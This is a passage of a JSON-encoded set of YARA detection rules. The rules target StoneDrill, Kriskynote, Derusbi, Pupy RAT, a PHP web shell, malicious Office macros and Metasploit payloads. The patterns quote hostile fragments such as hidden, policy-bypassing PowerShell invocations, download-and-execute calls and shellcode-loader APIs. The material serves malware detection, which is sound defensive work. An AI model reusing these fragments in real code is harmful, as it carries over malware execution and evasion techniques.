hidden \" ascii nocase\n      $sb2 = \" -window hidden \" ascii nocase\n      $sb3 = \" -windowstyle hidden \" ascii nocase\n      $sc1 = \" -nop \" ascii nocase\n      $sc2 = \" -noprofile \" ascii nocase\n      $sd1 = \" -noni \" ascii nocase\n      $sd2 = \" -noninteractive \" ascii nocase\n      $se1 = \" -ep bypass \" ascii nocase\n      $se2 = \" -exec bypass \" ascii nocase\n      $se3 = \" -executionpolicy bypass \" ascii nocase\n      $se4 = \" -exec bypass \" ascii nocase\n      $sf1 = \" -sta \" ascii\n      $fp1 = \"Chocolatey Software\" \n      $fp2 = \"VBOX_MSI_INSTALL_PATH\" \n   condition: \n      filesize < 3000KB and 4 of ( $s* ) and not 1 of ( $fp* )\n}","date":"2017-03-12 14:47:41","description":"Detects PowerShell invocation with suspicious parameters","minimum_yara":"1.7","name":"PowerShell_Susp_Parameter_Combo_RID336F","reference":"https://goo.gl/uAic1X","required_modules":[],"rule_hash":"52cdea0c983cae62e9d8ca3bf497d3d7","score":60,"tags":["DEMO","T1064","T1086","SCRIPT","ANOMALY"]},{"author":"Florian Roth","content":"rule StoneDrill_BAT_1_RID2CD7 : APT DEMO FILE MIDDLE_EAST {\n   meta:\n      description = \"Rule to detect Batch file from StoneDrill report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 10:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set u100=\" ascii\n      $s2 = \"set u200=service\" ascii fullword\n      $s3 = \"set u800=%~dp0\" ascii fullword\n      $s4 = \"\\\"%systemroot%\\\\system32\\\\%u100%\\\"\" ascii\n      $s5 = \"%\\\" start /b %systemroot%\\\\system32\\\\%\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68636540 and 2 of them and filesize < 500\n}","date":"2017-03-07 10:06:21","description":"Rule to detect Batch file from StoneDrill report","minimum_yara":"1.7","name":"StoneDrill_BAT_1_RID2CD7","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"769284956c5e9fe219ad2f39fd49d0af","score":75,"tags":["APT","DEMO","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule StoneDrill_Service_Install_RID3177 : APT DEMO MIDDLE_EAST T1035 {\n   meta:\n      description = \"Rule to detect Batch file from StoneDrill report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 13:23:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MIDDLE_EAST, T1035\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"127.0.0.1 >nul && sc config\" ascii\n      $s2 = \"LocalService\\\" && ping -n\" ascii fullword\n      $s3 = \"127.0.0.1 >nul && sc start\" ascii fullword\n      $s4 = \"sc config NtsSrv binpath= \\\"C:\\\\WINDOWS\\\\system32\\ntssrvr64.exe\" ascii\n   condition: \n      2 of them and filesize < 500\n}","date":"2017-03-07 13:23:41","description":"Rule to detect Batch file from StoneDrill report","minimum_yara":"1.7","name":"StoneDrill_Service_Install_RID3177","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"7db335ec3db5560107d7724d26d91c89","score":75,"tags":["APT","DEMO","T1035","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule StoneDrill_ntssrvr32_RID2EF7 : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 11:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"g\\\\system32\\\\\" fullword wide\n      $s2 = \"ztvttw\" fullword wide\n      $s3 = \"lwizvm\" fullword ascii\n      $op1 = { 94 35 77 73 03 40 eb e9 } \n      $op2 = { 80 7c 41 01 00 74 0a 3d } \n      $op3 = { 74 0a 3d 00 94 35 77 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )\n}","date":"2017-03-07 11:37:01","description":"Detects malware from StoneDrill threat report","minimum_yara":"1.7","name":"StoneDrill_ntssrvr32_RID2EF7","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"334f70d8287bd1bdf2c3a32b287e3fac","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule StoneDrill_Malware_2_RID2ECA : APT DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c WMIC Process Call Create \\\"C:\\\\Windows\\\\System32\\\\Wscript.exe //NOLOGO \" fullword wide\n      $s2 = \"C:\\\\ProgramData\\\\InternetExplorer\" fullword wide\n      $s3 = \"WshShell.CopyFile \\\"\" fullword wide\n      $s4 = \"Abd891.tmp\" fullword wide\n      $s5 = \"Set WshShell = Nothing\" fullword wide\n      $s6 = \"AaCcdDeFfGhiKLlMmnNoOpPrRsSTtUuVvwWxyZz32\" fullword ascii\n      $s7 = \"\\\\FileInfo.txt\" fullword wide\n      $x1 = \"C-PDI-C-Cpy-T.vbs\" fullword wide\n      $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n      $x3 = \"C-PDC-C-Cpy-T.vbs\" fullword wide\n      $x4 = \"AC-PDC-C-Cpy-T.vbs\" fullword wide\n      $x5 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or 5 of them\n}","date":"2017-03-07 11:29:31","description":"Detects malware from StoneDrill threat report","minimum_yara":"1.7","name":"StoneDrill_Malware_2_RID2ECA","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"c0f33936dafe4c1151d2665646ae8d0e","score":75,"tags":["MAL","DEMO","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Florian Roth","content":"rule StoneDrill_RID2B11 : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from StoneDrill_RID2B11 threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 08:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n      $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n      $s1 = \"Hello dear\" fullword ascii\n      $s2 = \"WRZRZRAR\" fullword ascii\n      $opa1 = { 66 89 45 d8 6a 64 ff } \n      $opa2 = { 8d 73 01 90 0f bf 51 fe } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or ( all of ( $op* ) and all of ( $s* ) )\n}","date":"2017-03-07 08:50:41","description":"Detects malware from StoneDrill threat report","minimum_yara":"1.7","name":"StoneDrill_RID2B11","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"6c78e0292ca27cd9e6bfc83257102317","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule StoneDrill_VBS_1_RID2CEB : APT DEMO MIDDLE_EAST SCRIPT {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 10:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MIDDLE_EAST, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wmic /NameSpace:\\\\\\\\root\\\\default Class StdRegProv Call SetStringValue hDefKey = \\\"&H80000001\\\" sSubKeyName = \\\"Software\\\\Micros\" ascii\n      $x2 = \"ping 1.0.0.0 -n 1 -w 20000 > nul\" fullword ascii\n      $s1 = \"WshShell.CopyFile \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n      $s2 = \"WshShell.DeleteFile \\\"%temp%\\\\\" ascii\n      $s3 = \"WScript.Sleep(10 * 1000)\" fullword ascii\n      $s4 = \"Set WshShell = CreateObject(\\\"Scripting.FileSystemObject\\\") While WshShell.FileExists(\\\"\" ascii\n      $s5 = \" , \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n   condition: \n      ( filesize < 1KB and 1 of ( $x* ) or 2 of ( $s* ) )\n}","date":"2017-03-07 10:09:41","description":"Detects malware from StoneDrill threat report","minimum_yara":"1.7","name":"StoneDrill_VBS_1_RID2CEB","reference":"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/","required_modules":[],"rule_hash":"ea4fd67066a84799d5d5c4b42f319818","score":75,"tags":["APT","DEMO","SCRIPT","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule Kriskynote_Mar17_2_RID2DBC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fgjfcn8456fgjhfg89653wetwts\" fullword ascii\n      $op0 = { 33 c0 80 34 30 03 40 3d e6 21 00 00 72 f4 b8 e6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}","date":"2017-03-03 10:44:31","description":"Detects Kriskynote Malware","minimum_yara":"1.7","name":"Kriskynote_Mar17_2_RID2DBC","reference":"Internal Research","required_modules":[],"rule_hash":"705712e6a5f5456013df0117ebbe5912","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Derusbi_Backdoor_Mar17_1_RID2FDA : DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects a variant of the Derusbi backdoor\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 12:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n      $x2 = \"c%WINDIR%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\pchsvc.dll\" fullword wide\n      $x3 = \"%Systemroot%\\\\Help\\\\perfc009.dat\" fullword wide\n      $x4 = \"rundll32.exe \\\"%s\\\", R32 %s\" fullword wide\n      $x5 = \"OfficeUt32.dll\" fullword ascii\n      $x6 = \"\\\\\\\\.\\\\pipe\\\\usb%so\" fullword wide\n      $x7 = \"\\\\\\\\.\\\\pipe\\\\usb%si\" fullword wide\n      $x8 = \"\\\\tmp1.dat\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}","date":"2017-03-03 12:14:51","description":"Detects a variant of the Derusbi backdoor","minimum_yara":"1.7","name":"Derusbi_Backdoor_Mar17_1_RID2FDA","reference":"Internal Research","required_modules":[],"rule_hash":"840583059cdfc5e3f0d1885e40a9cb2f","score":75,"tags":["DEMO","T1085","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Kriskynote_Mar17_1_RID2DBB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"gzwrite64\" fullword ascii\n      $opa1 = { e8 6b fd ff ff 83 f8 ff 74 65 83 7b 28 00 74 42 } \n      $opb1 = { 8a 04 08 8b 8e a4 16 00 00 88 44 24 0c 66 c7 04 } \n      $opb2 = { 89 4e 6c 89 46 74 e9 ad fc ff ff 8b 46 68 85 c0 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and ( $opa1 or all of ( $opb* ) )\n}","date":"2017-03-03 10:44:21","description":"Detects Kriskynote Malware","minimum_yara":"1.7","name":"Kriskynote_Mar17_1_RID2DBB","reference":"Internal Research","required_modules":[],"rule_hash":"ec66b7b2721175e1a8d474682f096e11","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Kriskynote_Mar17_3_RID2DBD : DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"rundll32 %s Check\" fullword ascii\n      $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RecentDocs\" fullword ascii\n      $s3 = \"name=\\\"IsUserAdmin\\\"\" fullword ascii\n      $s4 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}","date":"2017-03-03 10:44:41","description":"Detects Kriskynote Malware","minimum_yara":"1.7","name":"Kriskynote_Mar17_3_RID2DBD","reference":"Internal Research","required_modules":[],"rule_hash":"328ed08b0e7ef903be7d95db642d402c","score":75,"tags":["DEMO","T1085","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PHP_Webshell_1_Feb17_RID2DF2 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a simple cloaked PHP web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127\"\n      date = \"2017-02-28 10:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?php ${\\\"\\\\x\" ascii\n      $x1 = \"\\\";global$auth;function sh_decrypt_phase($data,$key){${\\\"\" ascii\n      $x2 = \"global$auth;return sh_decrypt_phase(sh_decrypt_phase($\" ascii\n      $x3 = \"]}[\\\"\\x64\\\"]);}}echo \" ascii\n      $x4 = \"\\\"=>@phpversion(),\\\"\\\\x\" ascii\n      $s1 = \"$i=Array(\\\"pv\\\"=>@phpversion(),\\\"sv\\\"\" ascii\n      $s3 = \"$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them\n}","date":"2017-02-28 10:53:31","description":"Detects a simple cloaked PHP web shell","minimum_yara":"1.7","name":"PHP_Webshell_1_Feb17_RID2DF2","reference":"https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127","required_modules":[],"rule_hash":"98f18922ec97f38f644303d7ee88d6b9","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WordDoc_PowerShell_URLDownloadToFile_RID34F4 : DEMO FILE MAL OFFICE SCRIPT T1086 {\n   meta:\n      description = \"Detects Word Document with PowerShell URLDownloadToFile\"\n      author = \"Florian Roth\"\n      reference = \"https://www.arbornetworks.com/blog/asert/additional-insights-shamoon2/\"\n      date = \"2017-02-23 15:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, OFFICE, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $w1 = \"Microsoft Forms 2.0 CommandButton\" fullword ascii\n      $w2 = \"Microsoft Word 97-2003 Document\" fullword ascii\n      $p1 = \"powershell.exe\" fullword ascii\n      $p2 = \"URLDownloadToFile\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and 1 of ( $w* ) and all of ( $p* ) )\n}","date":"2017-02-23 15:52:31","description":"Detects Word Document with PowerShell URLDownloadToFile","minimum_yara":"1.7","name":"WordDoc_PowerShell_URLDownloadToFile_RID34F4","reference":"https://www.arbornetworks.com/blog/asert/additional-insights-shamoon2/","required_modules":[],"rule_hash":"87d9fd8b804fb0024aa59fd9841fdfcb","score":75,"tags":["OFFICE","SCRIPT","MAL","DEMO","T1086","FILE"]},{"author":"Florian Roth","content":"rule APT_PupyRAT_PY_RID2BF2 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Pupy RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations\"\n      date = \"2017-02-17 09:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"reflective_inject_dll\" fullword ascii\n      $x2 = \"ImportError: pupy builtin module not found !\" fullword ascii\n      $x3 = \"please start pupy from either it's exe stub or it's reflective DLLR;\" fullword ascii\n      $x4 = \"[INJECT] inject_dll.\" fullword ascii\n      $x5 = \"import base64,zlib;exec zlib.decompress(base64.b64decode('eJzzcQz1c/ZwDbJVT87Py0tNLlHnAgA56wXS'))\" fullword ascii\n      $op1 = { 8b 42 0c 8b 78 14 89 5c 24 18 89 7c 24 14 3b fd } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and 1 of them ) or ( 2 of them )\n}","date":"2017-02-17 09:28:11","description":"Detects Pupy RAT","minimum_yara":"1.7","name":"APT_PupyRAT_PY_RID2BF2","reference":"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations","required_modules":[],"rule_hash":"09a191b2c03fa158d39f13231101b7e9","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_MagicHound_MalMacro_RID2F9F : APT DEMO FILE OFFICE T1086 T1193 T1203 {\n   meta:\n      description = \"Detects malicious macro / powershell in Office document\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations\"\n      date = \"2017-02-17 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, OFFICE, T1086, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe \" fullword ascii\n      $s2 = \"CommandButton1_Click\" fullword ascii\n      $s3 = \"URLDownloadToFile\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 8000KB and all of them )\n}","date":"2017-02-17 12:05:01","description":"Detects malicious macro / powershell in Office document","minimum_yara":"1.7","name":"APT_MagicHound_MalMacro_RID2F9F","reference":"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations","required_modules":[],"rule_hash":"768633d484dd36908416bffe638c1647","score":75,"tags":["OFFICE","T1203","T1193","DEMO","T1086","FILE","APT"]},{"author":"Florian Roth","content":"rule ShellCrew_StreamEx_1_RID2EB2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file 81f411415aefa5ad7f7ed2365d9a18d0faf33738617afc19215b69c23f212c07\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 11:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c  \\\"%s\\\"\" fullword wide\n      $s3 = \"uac\\\\bin\\\\install_test.pdb\" fullword ascii\n      $s5 = \"uncompress error:%d %s\" fullword ascii\n      $s7 = \"%s\\\\AdobeBak\\\\Proc.dat\" fullword wide\n      $s8 = \"e:\\\\workspace\\\\boar\" fullword ascii\n      $s12 = \"$\\\\data.ini\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 4 of them )\n}","date":"2017-02-10 11:25:31","description":"Semiautomatic generated rule - file 81f411415aefa5ad7f7ed2365d9a18d0faf33738617afc19215b69c23f212c07","minimum_yara":"1.7","name":"ShellCrew_StreamEx_1_RID2EB2","reference":"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar","required_modules":[],"rule_hash":"44059c9bb021dbf159b5c34fd0a4dfc5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule ShellCrew_StreamEx_1_msi_RID305A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file msi.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 12:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"msi.dll.eng\" fullword wide\n      $s2 = \"ahinovx\" fullword ascii\n      $s3 = \"jkpsxy47CDEMNSTYbhinqrwx56\" fullword ascii\n      $s4 = \"PVYdejmrsy12\" fullword ascii\n      $s6 = \"FLMTUZaijkpsxy45CD\" fullword ascii\n      $s7 = \"afhopqvw34ABIJOPTYZehmo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 3 of them )\n}","date":"2017-02-10 12:36:11","description":"Semiautomatic generated rule - file msi.dll","minimum_yara":"1.7","name":"ShellCrew_StreamEx_1_msi_RID305A","reference":"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar","required_modules":[],"rule_hash":"7e8c2a69aa211038a75505cd1326d478","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule ShellCrew_StreamEx_1_msi_dll_RID31F5 : APT DEMO FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file msi.dll.eng\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 13:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NDOGDUA\" fullword ascii\n      $s2 = \"NsrdsrN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4d9d and filesize < 300KB and all of them )\n}","date":"2017-02-10 13:44:41","description":"Semiautomatic generated rule - file msi.dll.eng","minimum_yara":"1.7","name":"ShellCrew_StreamEx_1_msi_dll_RID31F5","reference":"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar","required_modules":[],"rule_hash":"68f86b69d38f8cc64468665e86ae7a11","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_RID2D39 : APT DEMO FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.sh\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"export buf=\\\\\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7865 and filesize < 4KB and ( 10 of ( $s* ) ) ) or ( all of them )\n}","date":"2017-02-09 10:22:41","description":"Metasploit Payloads - file msf.sh","minimum_yara":"1.7","name":"Msfpayloads_msf_RID2D39","reference":"Internal Research","required_modules":[],"rule_hash":"57e9bfbac53f7fae5dad3db0a7a5d118","score":75,"tags":["APT","DEMO","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_2_RID2DCA : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.asp\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"& \\\"\\\\\\\" & \\\"svchost.exe\\\"\" fullword ascii\n      $s2 = \"CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n      $s3 = \"<% @language=\\\"VBScript\\\" %>\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-02-09 10:46:51","description":"Metasploit Payloads - file msf.asp","minimum_yara":"1.7","name":"Msfpayloads_msf_2_RID2DCA","reference":"Internal Research","required_modules":[],"rule_hash":"0a1985221b1cde5f82316b437f462add","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_psh_RID2EE3 : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-psh.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe -nop -w hidden -e\" ascii\n      $s2 = \"Call Shell(\" fullword ascii\n      $s3 = \"Sub Workbook_Open()\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-02-09 11:33:41","description":"Metasploit Payloads - file msf-psh.vba","minimum_yara":"1.7","name":"Msfpayloads_msf_psh_RID2EE3","reference":"Internal Research","required_modules":[],"rule_hash":"849cac7bcbe4f186fad7c19c982faf8f","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_5_RID2DCD : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.msi\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"required to install Foobar 1.0.\" fullword ascii\n      $s2 = \"Copyright 2009 The Apache Software Foundation.\" fullword wide\n      $s3 = \"{50F36D89-59A8-4A40-9689-8792029113AC}\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-02-09 10:47:21","description":"Metasploit Payloads - file msf.msi","minimum_yara":"1.7","name":"Msfpayloads_msf_5_RID2DCD","reference":"Internal Research","required_modules":[],"rule_hash":"b0163f00481568d8bffe86061521e6df","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_7_RID2DCF : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Private Declare PtrSafe Function CreateThread Lib \\\"kernel32\\\" (ByVal\" ascii\n      $s2 = \"= VirtualAlloc(0, 